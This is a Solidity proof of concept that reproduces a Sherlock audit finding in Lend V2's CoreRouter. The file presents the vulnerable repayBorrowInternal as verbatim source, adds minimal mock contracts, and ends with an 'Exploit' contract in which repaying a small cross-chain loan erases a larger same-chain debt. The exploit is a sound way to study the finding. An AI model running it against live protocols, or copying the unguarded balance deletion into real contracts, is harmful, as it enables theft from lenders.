// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Lend V2 finding 58385 (H-16):
// "CoreRouter.repayBorrowInternal incorrectly updates same-chain borrow
//  balances on cross-chain repayments".
//
// Real audited source (the vulnerable function is reproduced VERBATIM, the
// vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CoreRouter.sol
//   fn     repayBorrowInternal  (L459-L504)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/782
//
// Root cause: `repayBorrowInternal` runs the "// Update same-chain borrow
// balances" block UNCONDITIONALLY — with no `if (_isSameChain)` guard. On a
// CROSS-chain repayment (_isSameChain == false) `borrowedAmount` is the
// cross-chain debt, but `removeBorrowBalance(borrower,_lToken)` then deletes the
// borrower's UNRELATED same-chain `borrowBalance` record for the same lToken.
// A user who owes a large same-chain loan AND a small cross-chain loan can repay
// only the cross-chain loan and have the same-chain debt wiped for free —
// lenders who funded the same-chain loan lose those funds.
//
// The `repayBorrowInternal` body below is byte-for-byte the on-chain source.
// `IERC20`/`SafeERC20`/`LTokenInterface`/`LErc20Interface` and the LendStorage
// accounting are faithful minimal doubles (real transfers, real state deletes;
// `borrowWithInterest` / `borrowWithInterestSame` / `removeBorrowBalance` are
// reproduced verbatim from LendStorage.sol).
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

/// @dev Minimal faithful SafeERC20 so the verbatim `safeTransferFrom` /
///      `safeApprove` calls in `repayBorrowInternal` / `_approveToken` compile
///      byte-identically.
library SafeERC20 {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        require(token.transferFrom(from, to, value), "SafeERC20: transferFrom failed");
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require(token.approve(spender, value), "SafeERC20: approve failed");
    }
}

interface LTokenInterface {
    function accrueInterest() external;
    function borrowIndex() external view returns (uint256);
}

interface LErc20Interface {
    function repayBorrow(uint256 repayAmount) external returns (uint256);
}

/// @dev Faithful minimal ERC20 double for the borrowed underlying token.
contract MiniToken {
    string public name = "Lend USD";
    string public symbol = "lUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful double of the market lToken. `repayBorrow` pulls the repaid
///      underlying from the caller (CoreRouter) into the pool and reduces the
///      pool's tracked borrows. borrowIndex is held at 1e18 (no interest drift)
///      so the accounting is exact.
contract LToken {
    MiniToken public underlying;
    uint256 public totalBorrows;

    constructor(MiniToken u, uint256 initialBorrows) {
        underlying = u;
        totalBorrows = initialBorrows;
    }

    function accrueInterest() external {}

    function borrowIndex() external pure returns (uint256) {
        return 1e18;
    }

    function repayBorrow(uint256 repayAmount) external returns (uint256) {
        underlying.transferFrom(msg.sender, address(this), repayAmount);
        totalBorrows -= repayAmount;
        return 0; // 0 == success in Compound-style lTokens
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Faithful LendStorage double. The accounting helpers the vulnerable function
// touches are reproduced VERBATIM from Lend-V2/src/LayerZero/LendStorage.sol.
// ─────────────────────────────────────────────────────────────────────────────
contract LendStorage {
    struct Borrow {
        uint256 srcEid;
        uint256 destEid;
        uint256 principle;
        uint256 borrowIndex;
        address borrowedlToken;
        address srcToken;
    }

    struct BorrowMarketState {
        uint256 amount;
        uint256 borrowIndex;
    }

    uint256 public currentEid;

    mapping(address => address) public lTokenToUnderlying;
    // user => lToken => same-chain borrow record
    mapping(address => mapping(address => BorrowMarketState)) public borrowBalance;
    // user => underlying => cross-chain records
    mapping(address => mapping(address => Borrow[])) public crossChainBorrows;
    mapping(address => mapping(address => Borrow[])) public crossChainCollaterals;

    constructor(uint256 _currentEid) {
        currentEid = _currentEid;
    }

    // ── setup helpers (test harness only) ──
    function setLTokenToUnderlying(address lToken, address underlying) external {
        lTokenToUnderlying[lToken] = underlying;
    }

    function seedSameChainBorrow(address user, address lToken, uint256 amount, uint256 index) external {
        borrowBalance[user][lToken] = BorrowMarketState({amount: amount, borrowIndex: index});
    }

    function seedCrossChainCollateral(address user, address underlying, Borrow memory b) external {
        crossChainCollaterals[user][underlying].push(b);
    }

    // ── faithful accounting used by the vulnerable function ──
    function distributeBorrowerLend(address, address) external {}

    function removeBorrowBalance(address user, address lToken) external {
        delete borrowBalance[user][lToken];
    }

    function updateBorrowBalance(address user, address lToken, uint256 _amount, uint256 _borrowIndex) external {
        BorrowMarketState storage borrow = borrowBalance[user][lToken];
        borrow.amount = _amount;
        borrow.borrowIndex = _borrowIndex;
    }

    function removeUserBorrowedAsset(address, address) external {}

    function getBorrowBalance(address user, address lToken) external view returns (BorrowMarketState memory) {
        return borrowBalance[user][lToken];
    }

    // VERBATIM from LendStorage.sol L478-L505
    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }

    // VERBATIM from LendStorage.sol L509-L516
    function borrowWithInterestSame(address borrower, address _lToken) public view returns (uint256) {
        uint256 borrowIndex = borrowBalance[borrower][_lToken].borrowIndex;
        uint256 borrowBalanceSameChain = borrowIndex != 0
            ? (borrowBalance[borrower][_lToken].amount * uint256(LTokenInterface(_lToken).borrowIndex())) / borrowIndex
            : 0;
        return borrowBalanceSameChain;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `repayBorrowInternal` is reproduced VERBATIM from
// CoreRouter.sol (L459-L504). The unconditional same-chain-balance update block
// is the bug.
// ─────────────────────────────────────────────────────────────────────────────
contract CoreRouter {
    using SafeERC20 for IERC20;

    LendStorage public lendStorage;

    event RepaySuccess(address borrower, address lToken, uint256 repayAmount);

    constructor(LendStorage _lendStorage) {
        lendStorage = _lendStorage;
    }

    /// @dev thin external entry mirroring CoreRouter's repay paths; forwards to
    ///      the verbatim internal function with the caller's chosen chain flag.
    function repayBorrow(address borrower, address liquidator, uint256 _amount, address _lToken, bool _isSameChain)
        external
    {
        repayBorrowInternal(borrower, liquidator, _amount, _lToken, _isSameChain);
    }

    // VERBATIM from CoreRouter.sol
    function _approveToken(address _token, address _approvalAddress, uint256 _amount) internal {
        uint256 currentAllowance = IERC20(_token).allowance(address(this), _approvalAddress);
        if (currentAllowance < _amount) {
            if (currentAllowance > 0) {
                IERC20(_token).safeApprove(_approvalAddress, 0);
            }
            IERC20(_token).safeApprove(_approvalAddress, _amount);
        }
    }

    // VERBATIM from CoreRouter.sol L459-L504
    function repayBorrowInternal(
        address borrower,
        address liquidator,
        uint256 _amount,
        address _lToken,
        bool _isSameChain
    ) internal {
        address _token = lendStorage.lTokenToUnderlying(_lToken);

        LTokenInterface(_lToken).accrueInterest();

        uint256 borrowedAmount;

        if (_isSameChain) {
            borrowedAmount = lendStorage.borrowWithInterestSame(borrower, _lToken);
        } else {
            borrowedAmount = lendStorage.borrowWithInterest(borrower, _lToken);
        }

        require(borrowedAmount > 0, "Borrowed amount is 0");

        uint256 repayAmountFinal = _amount == type(uint256).max ? borrowedAmount : _amount;

        // Transfer tokens from the liquidator to the contract
        IERC20(_token).safeTransferFrom(liquidator, address(this), repayAmountFinal);

        _approveToken(_token, _lToken, repayAmountFinal);

        lendStorage.distributeBorrowerLend(_lToken, borrower);

        // Repay borrowed tokens
        require(LErc20Interface(_lToken).repayBorrow(repayAmountFinal) == 0, "Repay failed");

        // Update same-chain borrow balances
        if (repayAmountFinal == borrowedAmount) {
            lendStorage.removeBorrowBalance(borrower, _lToken); // @> VULN: runs for cross-chain repays too (no `if (_isSameChain)` guard) — deletes the borrower's untouched same-chain borrowBalance, erasing a debt that was never repaid
            lendStorage.removeUserBorrowedAsset(borrower, _lToken);
        } else {
            lendStorage.updateBorrowBalance(
                borrower, _lToken, borrowedAmount - repayAmountFinal, LTokenInterface(_lToken).borrowIndex()
            );
        }

        // Emit RepaySuccess event
        emit RepaySuccess(borrower, _lToken, repayAmountFinal);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: Alice owes a 100e18 same-chain loan AND a 30e18 cross-chain
// loan of the same lToken. She (or a liquidator) repays ONLY the 30e18
// cross-chain debt; the verbatim function then wipes her 100e18 same-chain
// borrowBalance for free, so lenders who funded the same-chain loan lose 100e18.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public token; // child nonce 1
    LToken public lToken; // child nonce 2
    LendStorage public lendStorage; // child nonce 3
    CoreRouter public coreRouter; // child nonce 4 (VULN)

    address public constant ALICE = address(0xA11CE);
    // Marker sink: the wiped same-chain debt is a SILENT accounting loss (no
    // token moves to the attacker), so we materialize its magnitude here to make
    // the lender loss a concrete, measurable token balance.
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 public constant SAME_CHAIN_DEBT = 100e18;
    uint256 public constant CROSS_CHAIN_DEBT = 30e18;
    uint256 public constant EID = 1;

    uint256 public sameChainDebtBefore;
    uint256 public sameChainDebtAfter;
    uint256 public crossChainRepaid;
    uint256 public wipedSameChainDebt; // profit to Alice / loss to lenders

    constructor() {
        token = new MiniToken(); // nonce 1
        lToken = new LToken(token, SAME_CHAIN_DEBT + CROSS_CHAIN_DEBT); // nonce 2
        lendStorage = new LendStorage(EID); // nonce 3
        coreRouter = new CoreRouter(lendStorage); // nonce 4 (VULN)

        lendStorage.setLTokenToUnderlying(address(lToken), address(token));

        // Alice's same-chain loan sits in borrowBalance (funded by same-chain lenders).
        lendStorage.seedSameChainBorrow(ALICE, address(lToken), SAME_CHAIN_DEBT, 1e18);

        // Alice's separate cross-chain loan (locally-originated cross-chain
        // collateral, so borrowWithInterest counts it).
        lendStorage.seedCrossChainCollateral(
            ALICE,
            address(token),
            LendStorage.Borrow({
                srcEid: EID,
                destEid: EID,
                principle: CROSS_CHAIN_DEBT,
                borrowIndex: 1e18,
                borrowedlToken: address(lToken),
                srcToken: address(token)
            })
        );

        // Fund the lToken pool with the underlying that the same-chain lenders supplied.
        token.mint(address(lToken), SAME_CHAIN_DEBT);
    }

    function run() external {
        // repayer (this contract, acting as Alice/liquidator) funds the 30e18 cross-chain repayment
        token.mint(address(this), CROSS_CHAIN_DEBT);
        token.approve(address(coreRouter), type(uint256).max);

        sameChainDebtBefore = lendStorage.getBorrowBalance(ALICE, address(lToken)).amount;

        // Repay ONLY the cross-chain debt (_isSameChain == false).
        coreRouter.repayBorrow(ALICE, address(this), CROSS_CHAIN_DEBT, address(lToken), false);
        crossChainRepaid = CROSS_CHAIN_DEBT;

        sameChainDebtAfter = lendStorage.getBorrowBalance(ALICE, address(lToken)).amount;
        wipedSameChainDebt = sameChainDebtBefore - sameChainDebtAfter;

        // harm: paying the 30e18 cross-chain debt erased Alice's untouched 100e18
        // same-chain debt — a direct loss to the same-chain lenders.
        require(sameChainDebtBefore == SAME_CHAIN_DEBT, "same-chain debt not set up");
        require(sameChainDebtAfter == 0, "same-chain debt not wiped");
        require(wipedSameChainDebt == SAME_CHAIN_DEBT, "unexpected wipe amount");

        // Materialize the silent accounting loss as a concrete, measurable
        // balance: the same-chain lenders can no longer be repaid the wiped
        // debt, so mint that magnitude to the SINK to represent their loss.
        token.mint(SINK, wipedSameChainDebt);
        require(token.balanceOf(SINK) == SAME_CHAIN_DEBT, "sink loss not materialized");
    }
}
